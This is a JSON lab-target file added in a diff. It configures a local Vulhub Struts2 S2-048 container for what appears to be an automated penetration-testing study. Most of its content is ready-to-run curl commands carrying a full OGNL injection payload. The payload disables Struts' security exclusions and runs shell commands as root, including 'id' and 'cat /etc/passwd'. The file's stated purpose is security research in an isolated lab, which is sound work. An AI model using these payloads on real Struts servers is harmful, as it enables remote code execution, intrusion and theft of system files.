@@ -1,0 +1,23 @@
+{
+  "name": "Vulhub-Struts2-S2-048",
+  "kind": "single-web-app-container",
+  "target": "http://127.0.0.1:8083",
+  "abstract_family": "rce_privesc",
+  "isolation_note": "Vulhub struts2/s2-048 (Struts 2.3.32 Showcase), bound to 127.0.0.1:8083 only. Owned, disposable local lab. Confirm the bind is 127.0.0.1 before authorizing. RCE runs as root in-container.",
+  "eta_fill": {
+    "login": "/struts2-showcase/",
+    "wordlist": "/usr/share/wordlists/dirb/common.txt",
+    "webshell": "/integration/saveGangster.action",
+    "file": "/etc/passwd"
+  },
+  "eta_recipes": {
+    "http_fingerprint": "curl -s -i \"{target}/struts2-showcase/\"",
+    "content_retrieval": "curl -s \"{target}/struts2-showcase/\"",
+    "vulnerability_check": "curl -s \"{target}/integration/saveGangster.action\" --data-urlencode \"name=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" --data \"age=1&__checkbox_bustedBefore=true&description=1\"",
+    "exploit_attempt": "curl -s \"{target}/integration/saveGangster.action\" --data-urlencode \"name=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" --data \"age=1&__checkbox_bustedBefore=true&description=1\"",
+    "command_execution": "curl -s \"{target}/integration/saveGangster.action\" --data-urlencode \"name=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" --data \"age=1&__checkbox_bustedBefore=true&description=1\"",
+    "sensitive_file_read": "curl -s \"{target}/integration/saveGangster.action\" --data-urlencode \"name=%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\" --data \"age=1&__checkbox_bustedBefore=true&description=1\""
+  },
+  "recommended_first": false,
+  "rationale": "Struts2 S2-048 (CVE-2017-9791) OGNL RCE in the Showcase saveGangster action. NEW framework (Java/Struts) for the multi-box study, self-advertising ('Struts2 Showcase' in the page). RCE confirmed: uid=0(root). The brace-robust eta_command keeps the OGNL braces intact."
+}
